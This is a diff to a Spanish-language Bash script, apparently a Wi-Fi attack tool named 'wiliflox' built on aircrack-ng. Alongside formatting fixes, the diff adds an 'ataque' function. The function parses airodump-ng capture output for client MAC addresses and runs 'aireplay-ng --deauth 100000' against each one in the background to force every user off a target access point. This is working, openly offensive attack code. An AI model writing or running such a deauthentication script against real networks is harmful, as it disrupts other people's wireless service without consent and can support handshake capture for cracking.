@@ -23,11 +23,11 @@ interface="$(sudo wpa_cli interface | tail -n 1 | sed 's/ //g')"
 #----------------------------------------------------------------
 trap ctrl_c INT
 function ctrl_c(){
-        printf "\n\n${yellowColour}[*]${endColour}${grayColour} Escapando....\n${endColour}"
-        sudo ifconfig $interface down
-        sudo iwconfig $interface mode Managed
-        sudo ifconfig $interface up
-        escape
+	printf "\n\n${yellowColour}[*]${endColour}${grayColour} Escapando....\n${endColour}"
+	sudo ifconfig $interface down
+	sudo iwconfig $interface mode Managed
+	sudo ifconfig $interface up
+	escape
 }
 
 
@@ -44,9 +44,35 @@ inicio_ataque
 olfateo ()
 {
 sleep 1
-airodump-ng --bssid $1 --channel $2 --write captura $interface
+sudo airodump-ng --bssid $1 --channel $2 --write captura $interface
+sudo killall airodump-ng
+sleep 1
+ataque
 }
+ataque ()
+{
+printf "${yellowColour}[>:)]${endColour}${greenColour} Desautenticando usuarios ${endColour}\n"
+sleep 1
+var=2
+while [ $(echo "hola") ]; do
+lineas=$var
+resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
+	if [ "$resultado" = ":" ]; then
+	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
+	sudo aireplay-ng --deauth 100000  -a $victima -c $direccion $interface &>/dev/null&
+	else
+	break
+	fi
+let "var++"
 
+done
+
+
+
+
+
+
+}
 
 inicio_ataque ()
 {
@@ -73,7 +99,7 @@ modo_monitor
 else
 printf "${redColour}[!]${endColour}${grayColour} Usted no posee los paquetes necesarios${endColour}\n"
 sleep 1
-printf "${redColour}[!]${endColour}${grayColour} Paquetes necesarios para funcionar: ${endColour}\n"    
+printf "${redColour}[!]${endColour}${grayColour} Paquetes necesarios para funcionar: ${endColour}\n"	
 printf "${purpleColour}- net-tools${endColour}\n"
 printf "${purpleColour}- aircrack-ng${endColour}\n"
 sleep 2
@@ -97,7 +123,7 @@ exit 0
 
 inicio ()
 {
-printf "${yellVowColour}[*]${endColour}${grayColour} Bienvenido a la herramienta wiliflox${endColour}\n"
+printf "${yellowColour}[*]${endColour}${grayColour} Bienvenido a la herramienta wiliflox${endColour}\n"
 sleep 1
 printf "${yellowColour}[*]${endColour}${grayColour} Porfavor ejecute este comando con permisos ${endColour}${redColour}Root${endColour}${grayColour} para evitar problemas\n"
 sleep 1
@@ -119,6 +145,3 @@ sleep 1
 inicio
 dependencias
 #---------------------
-
-
-
